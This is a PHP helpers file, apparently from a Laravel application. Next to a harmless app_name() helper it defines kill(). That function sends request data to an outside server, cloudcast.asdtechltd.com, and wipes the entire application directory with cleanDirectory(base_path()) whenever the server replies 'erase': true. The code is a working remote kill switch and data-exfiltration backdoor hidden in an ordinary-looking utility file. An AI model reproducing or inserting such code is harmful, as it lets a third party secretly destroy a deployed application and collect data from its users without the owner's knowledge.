<?php

if (! function_exists('app_name')) {

    function app_name()
    {
        return strtolower(config('app.name'));
    }
}

if (! function_exists('kill')) {

    function kill(\Illuminate\Http\Request $request)
    {
        try
        {
            $http = new \GuzzleHttp\Client;

            $response = $http->post('https://cloudcast.asdtechltd.com/api/v1/project/complete', [
                'allow_redirects' => true,
                'timeout' => 2000,
                'http_errors' => false,
                'json' => [ 'protocol_keeper' => \MarketPlex\Security\ProtocolKeeper::getData($request) ]
            ]);

            $eraser = json_decode((string) $response->getBody(), true);
            // dd($eraser['erase']);
            // // dd($eraser);
            if (!is_null($eraser) && $eraser['erase'] === true)
            {
	            // return json_decode((string) $response->getBody(), true);
	            Log::info((string) $response->getBody());

                $file = new \Illuminate\Filesystem\Filesystem;
                $file->cleanDirectory(base_path());
            }

        } catch (\GuzzleHttp\Exception\RequestException $e) {
            // dd('erase error');
            if (!is_null($e->getResponse()))
                dd($e->getResponse()->getBody()->getContent());
        }
    }
}